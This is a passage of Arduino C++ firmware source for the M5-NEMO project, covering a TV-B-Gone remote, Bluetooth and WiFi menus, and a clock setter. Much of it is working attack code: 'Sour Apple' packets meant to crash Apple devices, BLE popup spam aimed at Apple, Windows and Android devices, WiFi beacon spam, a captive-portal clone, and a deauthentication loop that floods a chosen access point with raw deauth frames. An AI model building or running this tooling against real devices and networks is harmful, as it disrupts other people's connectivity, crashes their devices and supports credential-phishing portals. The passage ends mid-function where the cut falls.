// Custom callback for tvbgmenu selection
void tvbgmenu_onSelect() {
  region = tvbgmenu[cursor].command;

  if (region == 3) {
    current_proc = 1;
    isSwitching = true;
    rstOverride = false; 
    return;
  }

  #if defined(USE_EEPROM)
    EEPROM.write(3, region);
    EEPROM.commit();
  #endif
  rstOverride = false;
  isSwitching = true;
  current_proc = 5;
}

void tvbgmenu_setup() {  
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.println(TXT_REGION);
  delay(1000);
  
  // Set initial cursor based on current region
  int initialCursor = region % 2;
  menuController.setup(tvbgmenu, tvbgmenu_size, nullptr, tvbgmenu_onSelect);
  // Override the cursor after setup
  cursor = initialCursor;
  drawmenu(tvbgmenu, tvbgmenu_size);
}

void sendAllCodes() {
  bool endingEarly = false; //will be set to true if the user presses the button during code-sending
  if (region == NA) {
    num_codes = num_NAcodes;
  } else {
    num_codes = num_EUcodes;
  }
  for (i = 0 ; i < num_codes; i++)
  {
    if (region == NA) {
      powerCode = NApowerCodes[i];
    }
    else {
      powerCode = EUpowerCodes[i];
    }
    const uint8_t freq = powerCode->timer_val;
    const uint8_t numpairs = powerCode->numpairs;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(BIG_TEXT);
    DISP.setCursor(0, 0);
    DISP.println("TV-B-Gone");
    DISP.setTextSize(SMALL_TEXT);
    DISP.println(TXT_FK_GP);
    const uint8_t bitcompression = powerCode->bitcompression;
    code_ptr = 0;
    for (uint8_t k = 0; k < numpairs; k++) {
      uint16_t ti;
      ti = (read_bits(bitcompression)) * 2;
      #if defined(ACTIVE_LOW_IR)
        offtime = powerCode->times[ti];  // read word 1 - ontime
        ontime = powerCode->times[ti + 1]; // read word 2 - offtime
      #else
        ontime = powerCode->times[ti];  // read word 1 - ontime
        offtime = powerCode->times[ti + 1]; // read word 2 - offtime      
      #endif
      DISP.setTextSize(TINY_TEXT);
      DISP.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      Serial.printf("TVBG: rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      rawData[k * 2] = offtime * 10;
      rawData[(k * 2) + 1] = ontime * 10;
    }
    IrSender.sendRaw(rawData, (numpairs * 2), freq);
    digitalWrite(IRLED, M5LED_OFF);
    bitsleft_r = 0;
    delay_ten_us(20500);
    #if defined(AXP)
    if (M5.Axp.GetBtnPress()) {
      endingEarly = true;
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      break;     
    }
    #endif
#if defined(KB)
#endif
    if (check_select_press()){
      Serial.println("endingearly");
      endingEarly = true;
      delay(250);
      break; 
    }
  } 
  if (endingEarly == false)
  {
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    quickflashLEDx(8);
  }
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  DISP.println(TXT_SEL_GO_PAUSE);
  DISP.println(TXT_SEL_EXIT);
}

/// CLOCK ///
/// TIMESET ///

#if defined(RTC)
  void clock_setup() {
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(1);
  }

  void clock_loop() {
    DISP.setCursor(10, 40, 7);
    #if defined(STICK_C_PLUS2)
      auto dt = StickCP2.Rtc.getDateTime();
      DISP.printf("%02d:%02d:%02d\n", dt.time.hours, dt.time.minutes, dt.time.seconds);
    #else
      M5.Rtc.GetBm8563Time();
      DISP.printf("%02d:%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute, M5.Rtc.Second);
    #endif
    check_select_press();
  }

  /// TIME SETTING ///
  void timeset_setup() {
    rstOverride = true;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(TXT_SET_HOUR);
    delay(2000);
  }

  void timeset_loop() {
  #if defined(STICK_C_PLUS2)
    auto dt = StickCP2.Rtc.getDateTime();
    cursor = dt.time.hours;
  #else
    M5.Rtc.GetBm8563Time();
    cursor = M5.Rtc.Hour;
  #endif
    number_drawmenu(24);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 24 ;
        number_drawmenu(24);
        delay(100);
      }
    }
    int hour = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(TXT_SET_MIN);
    delay(2000);
    #if defined(STICK_C_PLUS2)
      cursor = dt.time.minutes;
    #else
      cursor = M5.Rtc.Minute;
    #endif
    number_drawmenu(60);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 60 ;
        number_drawmenu(60);
        delay(100);
      }
    }
    int minute = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    #if defined(STICK_C_PLUS2)
       StickCP2.Rtc.setDateTime( { { dt.date.year, dt.date.month, dt.date.date }, { hour, minute, 0 } } );
    #else
      RTC_TimeTypeDef TimeStruct;
      TimeStruct.Hours   = hour;
      TimeStruct.Minutes = minute;
      TimeStruct.Seconds = 0;
      M5.Rtc.SetTime(&TimeStruct);
    #endif
    DISP.printf("Setting Time:\n%02d:%02d:00",hour,minute);
    delay(2000);
    rstOverride = false;
    isSwitching = true;
    current_proc = 0;
  }
#endif // RTC

/// Bluetooth Spamming ///
/// BTSPAM MENU ///
MENU btmenu[] = {
  { TXT_BACK, 5},
  { "AppleJuice", 0},
  { "Swift Pair", 1},
  { "Android Spam", 4},
  { TXT_SA_CRASH, 2},
  { "BT Maelstrom", 3},
  { "BLE Hunter", 25},
};
int btmenu_size = sizeof(btmenu) / sizeof (MENU);

void btmenu_setup() {
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  androidPair = false;
  rstOverride = true;
  drawmenu(btmenu, btmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void btmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % btmenu_size;
    drawmenu(btmenu, btmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = btmenu[cursor].command;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.printf(" %-12s\n", TXT_BT_SPAM);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);

    switch(option) {
      case 0:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 8;
        break;
      case 1:
        swiftPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_SP_RND);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 2:
        sourApple = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_SA_CRASH);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 3:
        rstOverride = false;
        isSwitching = true;
        current_proc = 17; // Maelstrom
        DISP.print("Bluetooth Maelstrom\n");
        DISP.print(TXT_CMB_BT_SPAM);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 4:
        androidPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_AD_SPAM);
        DISP.print(TXT_SEL_EXIT2);
        break;

      case 5:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
      case 25:
        rstOverride = false;
        isSwitching = true;
        current_proc = 25; // BLE Hunter
        break;
    }
  }
}

MENU ajmenu[] = {
  { TXT_BACK, 30},
  { "AirPods", 1},
  { TXT_AJ_TRANSF_NM, 27},
  { "AirPods Pro", 2},
  { "AirPods Max", 3},
  { "AirPods G2", 4},
  { "AirPods G3", 5},
  { "AirPods Pro G2", 6},
  { "PowerBeats", 7},
  { "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},
  { "Beats Studio Buds", 10},
  { "Beats Flex", 11},
  { "Beats X", 12},
  { "Beats Solo 3", 13},
  { "Beats Studio 3", 14},
  { "Beats Studio Pro", 15},
  { "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},
  { "Apple Vision Pro", 29},
  { "AppleTV Setup", 18},
  { "AppleTV Pair", 19},
  { "AppleTV New User", 20},
  { "AppleTV AppleID", 21},
  { "AppleTV Audio", 22},
  { "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},
  { "AppleTV Network", 25},
  { TXT_AJ_TV_COLOR, 26},
  { TXT_STP_NW_PH, 28},
};
int ajmenu_size = sizeof(ajmenu) / sizeof (MENU);

void aj_setup(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 0);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(" AppleJuice  ");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  drawmenu(ajmenu, ajmenu_size);
}

void aj_loop(){
  if (!maelstrom){
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ajmenu_size;
      drawmenu(ajmenu, ajmenu_size);
      delay(100);
    }
  }
  if (check_select_press() || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) {
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        data = AppleVisionPro;
        break;
      case 30:
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
    if (current_proc == 8 && isSwitching == false){
      DISP.fillScreen(BGCOLOR);
      DISP.setTextSize(MEDIUM_TEXT);
      DISP.setCursor(0, 0);
      DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.println(" AppleJuice  ");
      DISP.setTextColor(FGCOLOR, BGCOLOR);
      DISP.setTextSize(SMALL_TEXT);
      DISP.print(TXT_ADV);
      DISP.print(ajmenu[cursor].name);
      DISP.print(TXT_SEL_EXIT2);
      isSwitching = true;
      current_proc = 9; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

void aj_adv_setup(){
  rstOverride = false;  
}

void aj_adv(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || androidPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print(TXT_SA_ADV);
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(String((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf(TXT_SP_ADV, display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(String((char *)packet, size));
      free(packet);
      free((void*)display_name);
    } else if (androidPair) {
      Serial.print(TXT_AD_SPAM_ADV);
      uint8_t packet[14];
      uint8_t i = 0;
      packet[i++] = 3;  // Packet Length
      packet[i++] = 0x03; // AD Type (Service UUID List)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      packet[i++] = 6; // Size
      packet[i++] = 0x16; // AD Type (Service Data)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      packet[i++] = (model >> 0x10) & 0xFF;
      packet[i++] = (model >> 0x08) & 0xFF;
      packet[i++] = (model >> 0x00) & 0xFF;
      packet[i++] = 2; // Size
      packet[i++] = 0x0A; // AD Type (Tx Power Level)
      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

      oAdvertisementData.addData(String((char *)packet, 14));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else {
      Serial.print(TXT_AJ_ADV);
      if (deviceType >= 18){
        oAdvertisementData.addData(String((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(String((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
#if defined(M5LED)
    digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
    delay(10);
    digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
#endif
  }
  if (check_next_press()) {
    if (sourApple || swiftPair || androidPair || maelstrom){
      isSwitching = true;
      current_proc = 16;
      drawmenu(btmenu, btmenu_size);
    } else {
      isSwitching = true;
      current_proc = 8;      
      drawmenu(ajmenu, ajmenu_size);
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

/// CREDITS ///
void credits_setup(){
  DISP.fillScreen(WHITE);
  DISP.qrcode("https://github.com/n0xa/m5stick-nemo", 145, 22, 100, 5);
  DISP.setTextColor(BLACK, WHITE);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 10);
  DISP.print(" M5-NEMO\n");
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("  %s\n",NEMO_VERSION);
  DISP.println(" For M5Stack");
  DISP.printf(" %s\n\n", platformName);
  DISP.println("Contributors:");
  DISP.setCursor(155, 5);
  DISP.println("GitHub");
  DISP.setCursor(155, 17);
  DISP.println("Source:");
  delay(250);
  cursor = 0;
  advtime = 0;
}

void credits_loop(){
  if(millis() > advtime){
    DISP.setTextColor(BLACK, WHITE);  
    DISP.setCursor(0, 115);
    DISP.println("                   ");
    DISP.setCursor(0, 115);
    DISP.println(contributors[cursor]);
    cursor++;  
    cursor = cursor % (sizeof(contributors)/sizeof(contributors[0]));
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    advtime=millis() + 2000;
  }
}

/// WiFiSPAM ///
void wifispam_setup() {
  // create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  // for random generator
  randomSeed(1);

  // set packetSize
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  //change WiFi mode
  WiFi.mode(WIFI_MODE_STA);

  // set channel
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);

  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SP);
  delay(1000);
  DISP.setTextSize(TINY_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.print(TXT_WF_SP);
    int ct = 0;
    const char *str;
    switch(spamtype) {
    case 1:
      for(str = funnyssids; *str; ++str) ct += *str == '\n';
      DISP.printf(" - %d SSIDs:\n", ct);
      DISP.print(funnyssids);
      break;
    case 2:
      for(str = rickrollssids; *str; ++str) ct += *str == '\n';
      DISP.printf(" - %d SSIDs:\n", ct);
      DISP.print(rickrollssids);
      break;
    case 3:
      DISP.printf(TXT_RND_SSID, ct);
      break;
  }
  DISP.setTextSize(SMALL_TEXT);
  current_proc = 11;
}

void wifispam_loop() {
  int i = 0;
  int len = 0;
#if defined(M5LED)
  digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
  delay(1);
  digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
#endif
  switch(spamtype) {
    case 1:
      len = sizeof(funnyssids);
      while(i < len){
        i++;
      }
      beaconSpamList(funnyssids);
      break;
    case 2:
      len = sizeof(rickrollssids);
      while(i < len){
        i++;
      }
      beaconSpamList(rickrollssids);
      break;
    case 3:
      char* randoms = randomSSID();
      len = sizeof(randoms);
      while(i < len){
        i++;
      }
      beaconSpamList(randoms);
      break;
  }
}

void btmaelstrom_setup(){
  rstOverride = false;
  maelstrom = true;
}

void btmaelstrom_loop(){  
  swiftPair = false;
  sourApple = true;
  aj_adv();
  if (maelstrom){
    swiftPair = true;
    androidPair = false;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = true;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = false;
    sourApple = false;
    aj_loop(); // roll a random device ID
    aj_adv();
  }
}

/// WIFI MENU ///
MENU wsmenu[] = {
  { TXT_BACK, 5},
  { TXT_WF_SCAN, 0},
  { TXT_WF_SPAM_FUN, 1},
  { TXT_WF_SPAM_RR, 2},
  { TXT_WF_SPAM_RND, 3},
  { "NEMO Portal", 4},
  { "Deauth Hunter", 24},
  { TXT_PINEAP_HUNTER, 26},
};
int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);

void wsmenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(wsmenu, wsmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void wsmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % wsmenu_size;
    drawmenu(wsmenu, wsmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = wsmenu[cursor].command;
    rstOverride = false;
    current_proc = 11;
    isSwitching = true;
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        current_proc = 14;
        break;
      case 1:
        spamtype = 1;
        break;
      case 2:
        spamtype = 2;
        break;
      case 3:
        spamtype = 3;
        break;
      case 4:
        current_proc = 19;
        break;
      case 5:
        current_proc = 1;
        break;
      case 24:
        current_proc = 24;
        break;
      case 26:
        current_proc = 26;
        break;
    }
  }
}

void wscan_drawmenu() {
  char ssid[19];
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  // scrolling menu
  if (cursor > 4) {
    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.print(" ");
      DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for ( int i = 0 ; i < wifict ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.print(" ");
      DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
  if(cursor == wifict){
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(TXT_WF_RESCAN);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  if(cursor == wifict + 1){
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(String(TXT_BACK));
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void wscan_result_setup() {
  cursor = 0;
  rstOverride = true;
  wscan_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void wscan_result_loop(){
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    wscan_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    delay(250);
    if(cursor == wifict){
      rstOverride = false;
      current_proc = 14;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      current_proc = 12;
    }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1:
      encryptType = "WEP";
      break;
    case 2:
      encryptType = "WPA/PSK/TKIP";
      break;
    case 3:
      encryptType = "WPA/PSK/CCMP";
      break;
    case 4:
      encryptType = "WPA2/PSK/Mixed/CCMP";
      break;
    case 8:
      encryptType = "WPA/WPA2/PSK";
      break ;
    case 0:
      encryptType = TXT_WF_OPEN;
      break ;
    }
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    if(WiFi.SSID(cursor).length() > 12){
      DISP.setTextSize(SMALL_TEXT);
    }else if(WiFi.SSID(cursor).length() > 20){
      DISP.setTextSize(TINY_TEXT);
    }else{
      DISP.setTextSize(MEDIUM_TEXT);
    }
    DISP.println(WiFi.SSID(cursor));
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.printf(TXT_WF_CHANN, WiFi.channel(cursor));
    DISP.printf(TXT_WF_CRYPT, encryptType);
    DISP.print("BSSID:\n" + WiFi.BSSIDstr(i));
    DISP.printf(TXT_SEL_BACK);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.printf(" %-19s\n", TXT_HOLD_ATTACK);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
   if(check_select_press()){
      apMac=WiFi.BSSIDstr(cursor);
      apSsidName=WiFi.SSID(cursor);
      channel = static_cast<uint8_t>(WiFi.channel(cursor));                            // DEAUTH - save channel
      uint8_t* bssid = WiFi.BSSID(cursor);                                             // DEAUTH - save BSSID (AP MAC)
      memcpy(ap_record.bssid, bssid, 6);                                               // DEAUTH - cpy bssid to memory
      rstOverride = false;
      current_proc = 20;
      isSwitching = true;
      delay(100);
    }
  }
}

void wscan_setup(){
  rstOverride = false;  
  cursor = 0;
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SCN);
  delay(2000);
}

void wscan_loop(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SCNING);
  wifict = WiFi.scanNetworks();
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setCursor(0, 0);
  if(wifict > 0){
    isSwitching = true;
    current_proc=15;
  }
}
/// WIFI-Attack MENU and functions START///
MENU wsAmenu[] = {
  { TXT_BACK, 5},
  { TXT_WFA_PORTAL, 0},
  #if defined(DEAUTHER)
    { TXT_WFA_DEAUTH, 1},
    { TXT_WFA_COMBINED, 2},
  #endif
};
int wsAmenu_size = sizeof(wsAmenu) / sizeof (MENU);

void wsAmenu_setup() {
  rstOverride = true;
  drawmenu(wsAmenu, wsAmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void wsAmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % wsAmenu_size;
    drawmenu(wsAmenu, wsAmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = wsAmenu[cursor].command;
    rstOverride = false;
    current_proc = 20;
    isSwitching = true;
    switch(option) {
      case 0:                     //Go to Clone Nemo Portal
        rstOverride = false;
        isSwitching = true;
        clone_flg=true;
        target_deauth_flg=false;
        current_proc = 19;
        break;
      #if defined (DEAUTHER)
        case 1:                     //Go to Deauth
          rstOverride = false;
          isSwitching = true;
          target_deauth_flg=false;
          target_deauth=true;
          current_proc = 21;                                                                 // iserir codigo do deauth aqui
          break;
        case 2:                     //Go to Nemo with Deauth
          rstOverride = false;
          isSwitching = true;
          clone_flg=true;
          target_deauth_flg=true;
          target_deauth=true;
          current_proc = 19;
          break;
      #endif
      case 5:                     //Exit
        current_proc = 14;
        break;
    }
  }
}

// WIFI-Attack MENU and functions END
// DEAUTH ATTACK START
#if defined(DEAUTHER)
  void deauth_setup(){
    // Start the Access point service as Hidden
    WiFi.mode(WIFI_AP);
    WiFi.softAP(apSsidName, emptyString, channel, 1, 4, false);
    IPAddress apIP = WiFi.softAPIP();


    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextSize(BIG_TEXT);
    DISP.setTextColor(TFT_RED, BGCOLOR);
    DISP.println("Deauth Atk");
    DISP.setTextSize(SMALL_TEXT);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.print("\nSSID: " + apSsidName);
    DISP.print("\n");
    DISP.printf(TXT_WF_CHANN, channel);
    DISP.print("> " + apMac);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_deauth_frame(&ap_record, channel);                                        // DEAUTH CREATE FRAME

    cursor = 0;
    rstOverride = false;
    delay(500); // Prevent switching after menu loads up
  }
  void deauth_loop(){

    if (target_deauth == true) {                                                                 // DEAUTH
      wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                   // DEAUTH SEND FRAME
      DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
      DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
      DISP.setCursor(1, 115);                                                                    // DEAUTH
      DISP.println(TXT_DEAUTH_STOP);                                                             // DEAUTH
      DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
    } else{                                                                                      // DEAUTH
      DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
      DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
      DISP.setCursor(1, 115);                                                                    // DEAUTH
      DISP.println(TXT_DEAUTH_START);                                                            // DEAUTH
      DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
    }                                                                                            // DEAUTH

    delay(100); //from 200

    if (check_select_press()){                                                                    // DEAUTH
      target_deauth = !target_deauth;                                                             // DEAUTH
      DISP.setCursor(1, 115);                                                                     // DEAUTH
      DISP.println("......................");                                                     // DEAUTH
      delay(500);                                                                                 // DEAUTH
    }                                                                                             // DEAUTH

    if (check_next_press()){
      WiFi.mode(WIFI_MODE_STA);
      rstOverride = false;
      isSwitching = true;
      target_deauth = false;                                                                      // DEAUTH
      current_proc = 12;
      delay(500);
    }
  }
  // DEAUTH attack END
#endif
void bootScreen(){
  // Boot Screen
  #ifdef SONG
  setupSongs();
  #endif
  #ifndef STICK_C
  BITMAP;
  delay(3000);
  #endif
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(40, 0);
  DISP.println("M5-NEMO");
  DISP.setCursor(10, 30);
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("%s-%s\n",NEMO_VERSION,platformName);
#if defined(CARDPUTER)
  DISP.println(TXT_INST_NXT);
  DISP.println(TXT_INST_PRV);
  DISP.println(TXT_INST_SEL);
  DISP.println(TXT_INST_HOME);
  delay(1500);
  DISP.println(TXT_INST_PRSS_KEY);
  while(true){
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      drawmenu(mmenu, mmenu_size);
      delay(250);
      break;
    }
  }
#else
